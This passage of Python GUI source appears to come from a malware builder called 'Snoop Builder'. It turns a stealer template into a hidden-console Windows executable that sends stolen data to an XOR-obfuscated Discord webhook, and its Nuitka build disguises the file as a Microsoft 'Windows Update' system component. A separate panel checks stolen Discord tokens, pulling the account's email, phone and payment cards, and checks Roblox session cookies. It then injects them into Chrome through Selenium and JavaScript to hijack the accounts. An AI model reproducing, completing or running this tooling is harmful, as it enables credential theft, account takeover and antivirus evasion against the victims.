        dcl = QVBoxLayout(dc)
        dcl.setSpacing(12)

        dcl.addWidget(self._field("field_token"))
        token_row = QHBoxLayout()
        token_row.setSpacing(8)
        self.login_token = QLineEdit()
        self._reg_ph(self.login_token, "placeholder_token")
        btn_token_test = self._btn("btn_test", width=110)
        btn_token_test.clicked.connect(self._test_discord_token)
        btn_token_login = self._btn("btn_login_browser", width=170)
        btn_token_login.clicked.connect(self._discord_token_login_selenium)
        token_row.addWidget(self.login_token, 1)
        token_row.addWidget(btn_token_test)
        token_row.addWidget(btn_token_login)
        dcl.addLayout(token_row)

        dcl.addWidget(self._field("field_roblox"))
        roblox_row = QHBoxLayout()
        roblox_row.setSpacing(8)
        self.login_cookie = QLineEdit()
        self._reg_ph(self.login_cookie, "placeholder_roblox")
        btn_roblox_test = self._btn("btn_test", width=110)
        btn_roblox_test.clicked.connect(self._test_roblox_cookie)
        btn_roblox_login = self._btn("btn_login_browser", width=170)
        btn_roblox_login.clicked.connect(self._roblox_cookie_login_selenium)
        roblox_row.addWidget(self.login_cookie, 1)
        roblox_row.addWidget(btn_roblox_test)
        roblox_row.addWidget(btn_roblox_login)
        dcl.addLayout(roblox_row)

        dcl.addWidget(self._field("field_generic"))
        generic_row = QHBoxLayout()
        generic_row.setSpacing(8)
        self.login_generic_cookie = QLineEdit()
        self._reg_ph(self.login_generic_cookie, "placeholder_generic")
        self.login_generic_url = QLineEdit()
        self._reg_ph(self.login_generic_url, "placeholder_url")
        self.login_generic_url.setFixedWidth(200)
        btn_generic_login = self._btn("btn_login_browser", width=170)
        btn_generic_login.clicked.connect(self._generic_cookie_login_selenium)
        generic_row.addWidget(self.login_generic_cookie, 1)
        generic_row.addWidget(self.login_generic_url)
        generic_row.addWidget(btn_generic_login)
        dcl.addLayout(generic_row)

        dcl.addWidget(self._field("field_open"))
        open_row = QHBoxLayout()
        open_row.setSpacing(8)
        self.login_open_query = QLineEdit()
        self._reg_ph(self.login_open_query, "placeholder_open")
        btn_open = self._btn("btn_open", kind="secondary", width=110)
        btn_open.clicked.connect(self._open_in_browser)
        open_row.addWidget(self.login_open_query, 1)
        open_row.addWidget(btn_open)
        dcl.addLayout(open_row)

        l.addWidget(dc)

        result_group = QGroupBox(self._t("group_result"))
        self.result_group = result_group
        rl = QVBoxLayout(result_group)
        self.login_result = QTextEdit()
        self.login_result.setReadOnly(True)
        self.login_result.setFixedHeight(240)
        self._reg_ph(self.login_result, "placeholder_result")
        rl.addWidget(self.login_result)
        l.addWidget(result_group)

        l.addStretch()
        return w

    def _settings_page(self):
        w, l = self._content_wrap()
        l.addWidget(self._section("section_settings"))

        lang_group = QGroupBox(self._t("field_language"))
        self.lang_group = lang_group
        ll = QHBoxLayout(lang_group)
        self.lang_label = self._field("field_language_ui")
        self.lang_combo = QComboBox()
        self.lang_combo.addItems(["Français", "English"])
        self.lang_combo.setCurrentIndex(0 if self.current_language == "fr" else 1)
        self.lang_combo.currentIndexChanged.connect(self.change_language)
        ll.addWidget(self.lang_label)
        ll.addStretch()
        ll.addWidget(self.lang_combo)
        l.addWidget(lang_group)

        color_group = QGroupBox(self._t("group_color"))
        self.color_group = color_group
        cl = QHBoxLayout(color_group)
        btn_color = self._btn("btn_choose_color", kind="secondary")
        btn_color.clicked.connect(self.choose_color)
        self.color_preview = QLabel()
        self.color_preview.setFixedSize(36, 36)
        self._update_color_preview()
        cl.addWidget(btn_color)
        cl.addWidget(self.color_preview)
        cl.addStretch()
        l.addWidget(color_group)

        save_btn = self._btn("btn_save_settings")
        save_btn.clicked.connect(self.save_settings)
        l.addWidget(save_btn)

        l.addStretch()
        return w

    def verify_webhook(self):
        url = self.webhook.text().strip()
        if not url:
            QMessageBox.warning(self, self._t("msg_err"), self._t("msg_webhook_missing"))
            return
        try:
            r = requests.head(url, timeout=5)
            if r.status_code in (200, 204):
                QMessageBox.information(self, self._t("msg_test"), self._t("msg_webhook_valid"))
            else:
                QMessageBox.warning(self, self._t("msg_test"),
                                    f"{self._t('msg_return_code')} {r.status_code}.")
        except requests.exceptions.Timeout:
            QMessageBox.warning(self, self._t("msg_err"), self._t("msg_timeout"))
        except requests.exceptions.RequestException as e:
            QMessageBox.critical(self, self._t("msg_err"),
                                 f"{self._t('msg_check_failed')}\n{e}")

    def test_send_webhook(self):
        url = self.webhook.text().strip()
        if not url:
            QMessageBox.warning(self, self._t("msg_err"), self._t("msg_webhook_missing"))
            return
        try:
            r = requests.post(url, json={"content": "Test Snoop Builder"}, timeout=5)
            if r.status_code in (200, 204):
                QMessageBox.information(self, self._t("msg_test"), self._t("msg_test_ok"))
            else:
                QMessageBox.warning(self, self._t("msg_test"),
                                    f"{self._t('msg_test_fail')} ({r.status_code}).\n{r.text}")
        except requests.exceptions.RequestException as e:
            QMessageBox.critical(self, self._t("msg_err"), f"{self._t('msg_test_fail')}\n{e}")

    def choose_icon(self):
        p, _ = QFileDialog.getOpenFileName(self, self._t("field_icon"), "", "Icon Files (*.ico)")
        if p:
            self.icon.setText(p)

    def choose_path(self):
        p = QFileDialog.getExistingDirectory(self, self._t("field_buildpath"))
        if p:
            self.buildpath.setText(p)

    def _template_path(self):
        return _find_asset("templates/stealer_template.py", "stealer_template.py")

    @staticmethod
    def _normalize(s: str) -> str:
        s = unicodedata.normalize("NFKD", s)
        s = s.encode("ascii", "ignore").decode("ascii")
        s = re.sub(r"[^A-Za-z0-9]+", "_", s)
        return s.strip("_").upper()

    @staticmethod
    def _validate_filename(name: str) -> bool:
        return bool(re.match(r"^[A-Za-z0-9_.-]+$", name)) and len(name) > 0

    @staticmethod
    def _encode_webhook(url: str) -> str:
        key = b"SNPXOR2026!"
        raw = url.encode("utf-8")
        xored = bytes(b ^ key[i % len(key)] for i, b in enumerate(raw))
        return base64.b64encode(xored).decode("ascii")

    def start_build(self):
        self.progress.setVisible(True)
        self.logs.setVisible(True)
        self.progress.setValue(0)
        self.logs.clear()
        self._log(self._t("msg_build_started"))

        cfg = self.get_build_config()
        webhook_url = cfg["webhook_url"]

        if not webhook_url or not webhook_url.startswith("http"):
            QMessageBox.warning(self, self._t("msg_err"), self._t("msg_webhook_invalid"))
            self._log(f"[ERREUR] {self._t('msg_webhook_invalid')}")
            self.progress.setValue(0)
            return

        if not self._validate_filename(cfg["file_name"]):
            QMessageBox.warning(self, self._t("msg_filename_title"), self._t("msg_filename_body"))
            self._log("[ERREUR] Invalid filename.")
            self.progress.setValue(0)
            return

        template_path = self._template_path()
        if template_path is None:
            QMessageBox.critical(
                self, self._t("msg_template_missing_title"),
                f"{self._t('msg_template_missing_body')}\n"
                f"  {APP_DIR / 'templates'}\n  {APP_DIR}\n  {Path.cwd()}"
            )
            self._log("[ERREUR] stealer_template.py missing.")
            self.progress.setValue(0)
            return

        output_dir = Path(cfg["build_path"])
        output_dir.mkdir(parents=True, exist_ok=True)
        stealer_path = output_dir / (cfg["file_name"] + ".py")

        self.progress.setValue(10)
        self._log(f"{self._t('msg_generating')} {stealer_path}")

        try:
            content = self.generate_stealer_script(cfg, template_path)
            stealer_path.write_text(content, encoding="utf-8")
            self._log(self._t("msg_script_generated"))
            self.progress.setValue(40)
        except Exception as e:
            self._log(f"[ERREUR] {e}")
            QMessageBox.critical(self, self._t("msg_err"), f"{self._t('msg_gen_failed')}\n{e}")
            self.progress.setValue(0)
            return

        if cfg["file_type"] == ".py":
            self.progress.setValue(100)
            self._log(self._t("msg_py_generated"))
            QMessageBox.information(self, self._t("msg_done"),
                                    f"{self._t('msg_file_generated')}\n{stealer_path}")
            return

        if cfg["compiler"] == "Nuitka":
            self._build_nuitka(cfg, output_dir, stealer_path)
        else:
            self._build_pyinstaller(cfg, output_dir, stealer_path)

    def _build_pyinstaller(self, cfg, output_dir, stealer_path):
        self._log(self._t("msg_compiling_pyinstaller"))
        self.progress.setValue(50)
        try:
            build_folder = output_dir / "build"
            spec_file = output_dir / (cfg["file_name"] + ".spec")

            if build_folder.exists():
                shutil.rmtree(build_folder)
            if spec_file.exists():
                os.remove(spec_file)

            cmd = [
                sys.executable, "-m", "PyInstaller",
                "--onefile", "--noconsole", "--clean",
                "--log-level=WARN",
                f"--distpath={output_dir}",
                f"--workpath={output_dir / 'build'}",
                f"--specpath={output_dir}",
                "--hidden-import=Cryptodome",
                "--hidden-import=Cryptodome.Cipher",
                "--hidden-import=Cryptodome.Cipher.AES",
                "--hidden-import=Cryptodome.Protocol.KDF",
                "--hidden-import=Cryptodome.Hash",
                "--hidden-import=win32crypt",
                "--hidden-import=win32api",
                "--hidden-import=win32con",
                "--hidden-import=psutil",
                "--hidden-import=PIL",
                "--hidden-import=PIL.ImageGrab",
                "--hidden-import=browser_history",
                "--hidden-import=requests",
                "--hidden-import=sqlite3",
                "--hidden-import=winreg",
                "--collect-all=Cryptodome",
                "--collect-all=win32crypt",
                "--collect-all=psutil",
            ]
            if cfg["exe_icon"] and Path(cfg["exe_icon"]).exists():
                cmd.append(f"--icon={cfg['exe_icon']}")
            cmd.append(str(stealer_path))

            self._log(f"{self._t('msg_command')} {' '.join(cmd)}")
            self._run_subprocess(cmd, output_dir, cfg)

        except FileNotFoundError:
            self._log(f"[ERREUR] {self._t('msg_pyinstaller_missing')}")
            QMessageBox.critical(self, self._t("msg_err"), self._t("msg_pyinstaller_missing"))
            self.progress.setValue(0)
        except Exception as e:
            self._log(f"[ERREUR] {e}")
            QMessageBox.critical(self, self._t("msg_err"), f"{self._t('msg_unexpected')}\n{e}")
            self.progress.setValue(0)

    def _build_nuitka(self, cfg, output_dir, stealer_path):
        self._log(self._t("msg_compiling_nuitka"))
        self.progress.setValue(50)

        try:
            subprocess.run(
                [sys.executable, "-m", "nuitka", "--version"],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                check=True
            )
        except Exception:
            self._log(f"[ERREUR] {self._t('msg_nuitka_missing')}")
            QMessageBox.critical(self, self._t("msg_err"), self._t("msg_nuitka_missing"))
            self.progress.setValue(0)
            return

        cmd = [
            sys.executable, "-m", "nuitka",
            "--onefile",
            "--assume-yes-for-downloads",
            "--remove-output",
            f"--output-dir={output_dir}",
            f"--output-filename={cfg['file_name']}.exe",
            "--windows-disable-console",
            "--plugin-enable=multiprocessing",
            "--plugin-enable=sqlite3",
            "--include-package=cryptodome",
            "--include-package=win32crypt",
            "--include-package=psutil",
            "--include-package=PIL",
            "--include-package=requests",
            "--nofollow-import-to=tkinter",
            "--nofollow-import-to=test",
            "--nofollow-import-to=unittest",
            "--nofollow-import-to=setuptools",
            "--nofollow-import-to=pip",
            "--windows-company-name=Microsoft",
            "--windows-product-name=Windows Update",
            "--windows-file-description=System Component",
        ]
        if cfg["exe_icon"] and Path(cfg["exe_icon"]).exists():
            cmd.append(f"--windows-icon-from-ico={cfg['exe_icon']}")
        cmd.append(str(stealer_path))

        try:
            self._log(f"{self._t('msg_command')} {' '.join(cmd)}")
            self._run_subprocess(cmd, output_dir, cfg,
                                 expected_name=cfg["file_name"] + ".exe")
        except Exception as e:
            self._log(f"[ERREUR] {e}")
            QMessageBox.critical(self, self._t("msg_err"), f"{self._t('msg_unexpected')}\n{e}")
            self.progress.setValue(0)

    def _run_subprocess(self, cmd, output_dir, cfg, expected_name=None):
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            encoding="utf-8",
            errors="replace",
            creationflags=subprocess.CREATE_NO_WINDOW if os.name == "nt" else 0,
        )
        for line in iter(proc.stdout.readline, ""):
            if not line:
                break
            self._log(line.rstrip())
            self.progress.setValue(min(95, self.progress.value() + 1))
        proc.wait()

        if proc.returncode == 0:
            self.progress.setValue(100)
            exe_name = expected_name or (cfg["file_name"] + ".exe")
            exe_path = output_dir / exe_name
            self._log(self._t("msg_build_ok") + " " + str(exe_path))
            QMessageBox.information(self, self._t("msg_done"),
                                    f"{self._t('msg_build_ok')}\n{exe_path}")
        else:
            self._log(f"[ERREUR] {self._t('msg_return_code_err')} {proc.returncode}")
            QMessageBox.critical(self, self._t("msg_err"), self._t("msg_build_fail"))
            self.progress.setValue(0)

    def _log(self, msg):
        self.logs.append(msg)

    def get_build_config(self):
        return {
            "file_name": self.filename.text(),
            "file_type": self.filetype.currentText(),
            "compiler": self.compiler.currentText(),
            "exe_icon": self.icon.text(),
            "build_path": self.buildpath.text(),
            "version": self.version.text(),
            "webhook_url": self.webhook.text().strip(),
            "modules": {n: cb.isChecked() for n, cb in self.module_checkboxes.items()},
            "security_options": {n: cb.isChecked() for n, cb in self.security_checkboxes.items()},
        }

    def generate_stealer_script(self, config, template_path=None):
        if template_path is None:
            template_path = self._template_path()
        if template_path is None:
            raise FileNotFoundError("stealer_template.py missing")

        template = Path(template_path).read_text(encoding="utf-8")

        encoded = self._encode_webhook(config["webhook_url"])
        template = template.replace("%%WEBHOOK_URL%%", encoded)
        template = template.replace("%%WEBHOOK_XOR_KEY%%", "SNPXOR2026!")

        for option_name, enabled in config["security_options"].items():
            template = template.replace(
                f"%%SECURITY_{self._normalize(option_name)}%%", str(enabled)
            )

        for module, enabled in config["modules"].items():
            template = template.replace(
                f"%%MODULE_FLAG_{self._normalize(module)}%%", str(enabled)
            )

        leftovers = re.findall(r"%%[A-Z0-9_]+%%", template)
        if leftovers:
            raise RuntimeError("Unreplaced placeholders: " + ", ".join(sorted(set(leftovers))))

        return template

    def save_config(self):
        p, _ = QFileDialog.getSaveFileName(
            self, self._t("btn_save_config"), "snoop_config.json", "JSON (*.json)"
        )
        if not p:
            return
        try:
            data = self.get_build_config()
            Path(p).write_text(json.dumps(data, indent=2), encoding="utf-8")
            QMessageBox.information(self, self._t("msg_saved"), self._t("msg_config_saved"))
        except Exception as e:
            QMessageBox.warning(self, self._t("msg_err"), f"{self._t('msg_save_failed')}\n{e}")

    def load_config(self):
        p, _ = QFileDialog.getOpenFileName(self, self._t("btn_load"), "", "JSON (*.json)")
        if not p:
            return
        try:
            d = json.loads(Path(p).read_text(encoding="utf-8"))
            self.filename.setText(d.get("file_name", "snoop_payload"))
            idx = self.filetype.findText(d.get("file_type", ".py"))
            if idx >= 0:
                self.filetype.setCurrentIndex(idx)
            cidx = self.compiler.findText(d.get("compiler", "PyInstaller"))
            if cidx >= 0:
                self.compiler.setCurrentIndex(cidx)
            self.icon.setText(d.get("exe_icon", ""))
            self.buildpath.setText(d.get("build_path", str(Path.home() / "Desktop" / "SnoopBuild")))
            self.version.setText(d.get("version", "1.0.0"))
            self.webhook.setText(d.get("webhook_url", d.get("webhook", "")))

            loaded_modules = d.get("modules", {})
            for name, cb in self.module_checkboxes.items():
                cb.setChecked(loaded_modules.get(name, False))

            loaded_sec = d.get("security_options", d.get("security_state", {}))
            for name, cb in self.security_checkboxes.items():
                cb.setChecked(loaded_sec.get(name, False))

            QMessageBox.information(self, self._t("msg_loaded"), self._t("msg_config_loaded"))
        except Exception as e:
            QMessageBox.warning(self, self._t("msg_err"), f"{self._t('msg_load_failed')}\n{e}")

    def _test_discord_token(self):
        tok = self.login_token.text().strip()
        if not tok:
            QMessageBox.warning(self, self._t("msg_err"), self._t("msg_token_missing"))
            return

        self.login_result.clear()
        self.login_result.append(self._t("result_testing_token") + "\n")

        headers = {"Authorization": tok, "User-Agent": "Mozilla/5.0"}

        try:
            r = requests.get("https://discord.com/api/v9/users/@me",
                             headers=headers, timeout=10)
        except requests.RequestException as e:
            self.login_result.append(f"{self._t('result_network_err')} {e}")
            return

        if r.status_code == 401:
            self.login_result.append(self._t("result_token_invalid"))
            return
        if r.status_code == 403:
            self.login_result.append(self._t("result_token_blocked"))
            return
        if r.status_code != 200:
            self.login_result.append(f"{self._t('result_http')} {r.status_code}")
            return

        u = r.json()
        self.login_result.append(self._t("result_token_ok") + "\n")
        self.login_result.append(f"  ID           : {u.get('id')}")
        self.login_result.append(f"  Username     : {u.get('username')}#{u.get('discriminator','')}")
        self.login_result.append(f"  Global name  : {u.get('global_name')}")
        self.login_result.append(f"  Email        : {u.get('email')}")
        self.login_result.append(f"  Phone        : {u.get('phone')}")
        self.login_result.append(f"  Verified     : {u.get('verified')}")
        self.login_result.append(f"  MFA          : {u.get('mfa_enabled')}")
        nitro = {0: "none", 1: "Nitro Classic", 2: "Nitro", 3: "Nitro Basic"}.get(
            u.get("premium_type"), "?")
        self.login_result.append(f"  Nitro        : {nitro}")
        self.login_result.append(f"  Locale       : {u.get('locale')}")
        self.login_result.append("")

        try:
            gr = requests.get("https://discord.com/api/v9/users/@me/guilds",
                              headers=headers, timeout=10)
            if gr.status_code == 200:
                guilds = gr.json()
                self.login_result.append(self._t("result_guilds", n=len(guilds)))
                for g in guilds[:15]:
                    self.login_result.append(f"     - {g.get('name')} ({g.get('id')})")
                self.login_result.append("")
        except Exception:
            pass

        try:
            pr = requests.get("https://discord.com/api/v9/users/@me/billing/payment-sources",
                              headers=headers, timeout=10)
            if pr.status_code == 200:
                ps = pr.json()
                if ps:
                    self.login_result.append(self._t("result_payments", n=len(ps)))
                    for p in ps:
                        self.login_result.append(
                            f"     - {p.get('brand','')} ****{p.get('last_4','')} "
                            f"exp {p.get('expires_month','')}/{p.get('expires_year','')}"
                        )
        except Exception:
            pass

        self.login_result.append(self._t("result_test_done"))

    def _test_roblox_cookie(self):
        ck = self.login_cookie.text().strip()
        if not ck:
            QMessageBox.warning(self, self._t("msg_err"), self._t("msg_cookie_missing"))
            return

        self.login_result.clear()
        self.login_result.append(self._t("result_testing_cookie") + "\n")

        sess = requests.Session()
        sess.cookies.set(".ROBLOSECURITY", ck, domain=".roblox.com")

        try:
            r = sess.get("https://users.roblox.com/v1/users/authenticated", timeout=10)
        except requests.RequestException as e:
            self.login_result.append(f"{self._t('result_network_err')} {e}")
            return

        if r.status_code == 401:
            self.login_result.append(self._t("result_cookie_invalid"))
            return
        if r.status_code != 200:
            self.login_result.append(f"{self._t('result_http')} {r.status_code}")
            return

        u = r.json()
        uid = u.get("id")
        self.login_result.append(self._t("result_cookie_ok") + "\n")
        self.login_result.append(f"  Username : {u.get('name')}")
        self.login_result.append(f"  Display  : {u.get('displayName')}")
        self.login_result.append(f"  ID       : {uid}")
        self.login_result.append("")

        try:
            r2 = sess.get("https://economy.roblox.com/v1/user/currency", timeout=10)
            if r2.status_code == 200:
                self.login_result.append(f"  Robux    : {r2.json().get('robux','?')}")
        except Exception:
            pass

        try:
            r3 = sess.get(f"https://friends.roblox.com/v1/users/{uid}/friends/count", timeout=10)
            if r3.status_code == 200:
                self.login_result.append(f"  Friends  : {r3.json().get('count','?')}")
        except Exception:
            pass

        try:
            r4 = sess.get(f"https://premiumfeatures.roblox.com/v1/users/{uid}/validate-membership",
                          timeout=10)
            if r4.status_code == 200:
                self.login_result.append(f"  Premium  : {r4.text.strip()}")
        except Exception:
            pass

        try:
            r5 = sess.get(f"https://users.roblox.com/v1/users/{uid}", timeout=10)
            if r5.status_code == 200:
                d = r5.json()
                self.login_result.append(f"  Created  : {d.get('created','')}")
                desc = (d.get("description") or "")[:150]
                if desc:
                    self.login_result.append(f"  Bio      : {desc}")
        except Exception:
            pass

        self.login_result.append(self._t("result_test_done"))

    def _open_in_browser(self):
        q = self.login_open_query.text().strip()
        if not q:
            QMessageBox.warning(self, self._t("msg_err"), self._t("msg_id_missing"))
            return

        if q.isdigit():
            if 15 <= len(q) <= 20:
                url = f"https://discord.com/users/{q}"
            else:
                url = f"https://www.roblox.com/users/{q}/profile"
        else:
            url = f"https://www.roblox.com/search/users?keyword={q}"

        try:
            webbrowser.open(url)
            self.login_result.clear()
            self.login_result.append(f"{self._t('msg_opening')} {url}")
        except Exception as e:
            QMessageBox.critical(self, self._t("msg_err"), f"{self._t('msg_open_failed')}\n{e}")

    def _check_selenium(self):
        if not SELENIUM_OK:
            QMessageBox.critical(
                self, self._t("msg_selenium_missing_title"),
                self._t("msg_selenium_missing_body")
            )
            return False
        return True

    def _new_chrome_detached(self):
        opts = ChromeOptions()
        opts.add_experimental_option("detach", True)
        service = ChromeService(ChromeDriverManager().install())
        return webdriver.Chrome(service=service, options=opts)

    def _discord_token_login_selenium(self):
        if not self._check_selenium():
            return

        tok = self.login_token.text().strip()
        if not tok:
            QMessageBox.warning(self, self._t("msg_err"), self._t("msg_token_missing"))
            return

        self.login_result.clear()
        self.login_result.append(self._t("result_opening_chrome"))
        self.login_result.append(self._t("result_injecting_token"))

        try:
            driver = self._new_chrome_detached()
            driver.get("https://discord.com/login")

            js = """
            function login(token) {
                setInterval(() => {
                    document.body.appendChild(document.createElement('iframe'))
                        .contentWindow.localStorage.token = `"${token}"`;
                }, 50);
                setTimeout(() => { location.reload(); }, 2500);
            }
            login(arguments[0]);
            """
            driver.execute_script(js, tok)

            self.login_result.append(self._t("result_inject_done"))
            self.login_result.append(self._t("result_chrome_open"))
            self.login_result.append(self._t("result_token_may_invalidate"))
        except Exception as e:
            self.login_result.append(f"{self._t('result_fail')} {e}")
            QMessageBox.critical(self, self._t("msg_selenium_error"), str(e))

    def _roblox_cookie_login_selenium(self):
        if not self._check_selenium():
            return

        ck = self.login_cookie.text().strip()
        if not ck:
            QMessageBox.warning(self, self._t("msg_err"), self._t("msg_cookie_missing"))
            return

        self.login_result.clear()
        self.login_result.append(self._t("result_opening_chrome"))
        self.login_result.append(self._t("result_injecting_cookie"))

        try:
            import time as _t
            driver = self._new_chrome_detached()
            driver.get("https://www.roblox.com/")
            _t.sleep(2)

            driver.add_cookie({
                "name": ".ROBLOSECURITY",
                "value": ck,
                "domain": ".roblox.com",
                "path": "/",
            })
            driver.refresh()

            self.login_result.append(self._t("result_cookie_inject_done"))
            self.login_result.append(self._t("result_cookie_chrome_open"))
        except Exception as e:
            self.login_result.append(f"{self._t('result_fail')} {e}")
            QMessageBox.critical(self, self._t("msg_selenium_error"), str(e))

    def _generic_cookie_login_selenium(self):
        if not self._check_selenium():
            return

        cookie_str = self.login_generic_cookie.text().strip()
        url = self.login_generic_url.text().strip()
        if not cookie_str or not url:
            QMessageBox.warning(self, self._t("msg_err"), self._t("msg_cookie_url_missing"))
            return
        if not url.startswith("http"):
            url = "https://" + url

        self.login_result.clear()
        self.login_result.append(self._t("result_opening_chrome"))

        try:
            import time as _t
            driver = self._new_chrome_detached()
            driver.get(url)
            _t.sleep(2)

            domain = driver.current_url.split("/")[2]
            added = 0
            for pair in cookie_str.split(";"):
                pair = pair.strip()
                if "=" in pair:
                    n, v = pair.split("=", 1)
                    try:
                        driver.add_cookie({
                            "name": n.strip(),
                            "value": v.strip(),
                            "domain": domain,
                            "path": "/",
                        })
                        added += 1
                    except Exception:
                        pass
            driver.refresh()

            self.login_result.append(self._t("result_cookie_count", n=added, d=domain))
            self.login_result.append(self._t("result_chrome_open"))
        except Exception as e:
            self.login_result.append(f"{self._t('result_fail')} {e}")
            QMessageBox.critical(self, self._t("msg_selenium_error"), str(e))

    def change_language(self, index):
        self.current_language = "fr" if index == 0 else "en"
        self._apply_language()
        self._refresh_group_titles()
        self.save_settings()

    def _refresh_group_titles(self):
        try:
            self.webhook_group.setTitle(self._t("field_webhook"))
            self.modules_group.setTitle(self._t("field_modules"))
            self.security_group.setTitle(self._t("field_security"))
            self.cred_group.setTitle(self._t("group_credentials"))
            self.result_group.setTitle(self._t("group_result"))
            self.lang_group.setTitle(self._t("field_language"))
            self.color_group.setTitle(self._t("group_color"))
            self.hint_compiler.setText(self._t("hint_compiler"))
            self.hint_login.setText(self._t("hint_login"))
            if hasattr(self, "warn_selenium"):
                self.warn_selenium.setText(self._t("warn_selenium"))
        except Exception:
            pass

    def choose_color(self):
        c = QColorDialog.getColor(QColor(self.accent_color), self, self._t("group_color"))
        if c.isValid():
            self.accent_color = c.name()
            self.logo.set_color(self.accent_color)
            self._update_color_preview()
            self.setStyleSheet(self.styles())
            cur = self.stack.currentIndex()
            self._set_nav_active(
                self.btn_options if cur == 0
                else self.btn_builder if cur == 1
                else self.btn_login if cur == 2
                else self.btn_settings
            )
            self.save_settings()

    def _update_color_preview(self):
        self.color_preview.setStyleSheet(
            f"background-color: {self.accent_color};"
            f" border-radius: 6px; border: 1px solid {BORDER};"
        )

    def load_settings(self):
        if self.settings_file.exists():
            try:
                data = json.loads(self.settings_file.read_text(encoding="utf-8"))
                self.accent_color = data.get("accent_color", "#9d4edd")
                self.current_language = data.get("language", "fr")
            except Exception:
                pass

    def save_settings(self):
        data = {
            "accent_color": self.accent_color,
            "language": self.current_language,
        }
        try:
            data["webhook_url"] = self.webhook.text().strip()
            data["build_path"] = self.buildpath.text()
            data["file_name"] = self.filename.text()
            data["file_type"] = self.filetype.currentText()
            data["compiler"] = self.compiler.currentText()
            data["exe_icon"] = self.icon.text()
            data["version"] = self.version.text()
            data["modules"] = {n: cb.isChecked() for n, cb in self.module_checkboxes.items()}
            data["security_options"] = {n: cb.isChecked() for n, cb in self.security_checkboxes.items()}
        except AttributeError:
            pass
        self.settings_file.write_text(json.dumps(data, indent=2), encoding="utf-8")

    def _restore_saved_state(self):
        if not self.settings_file.exists():
            return
        try:
            data = json.loads(self.settings_file.read_text(encoding="utf-8"))
            if data.get("webhook_url"):
                self.webhook.setText(data["webhook_url"])
            if data.get("build_path"):
                self.buildpath.setText(data["build_path"])
            if data.get("file_name"):
                self.filename.setText(data["file_name"])
            idx = self.filetype.findText(data.get("file_type", ".py"))
            if idx >= 0:
                self.filetype.setCurrentIndex(idx)
            cidx = self.compiler.findText(data.get("compiler", "PyInstaller"))
            if cidx >= 0:
                self.compiler.setCurrentIndex(cidx)
            if data.get("exe_icon"):
                self.icon.setText(data["exe_icon"])
            if data.get("version"):
                self.version.setText(data["version"])
            mods = data.get("modules", {})
            for name, cb in self.module_checkboxes.items():
                if name in mods:
                    cb.setChecked(mods[name])
            sec = data.get("security_options", {})
            for name, cb in self.security_checkboxes.items():
                if name in sec:
                    cb.setChecked(sec[name])
        except Exception:
            pass


if __name__ == "__main__":
    app = QApplication(sys.argv)
    app.setFont(QFont("Segoe UI", 10))
    win = MainWindow()
    win._restore_saved_state()
    win._apply_language()
    win._refresh_group_titles()
    win.show()
    sys.exit(app.exec_())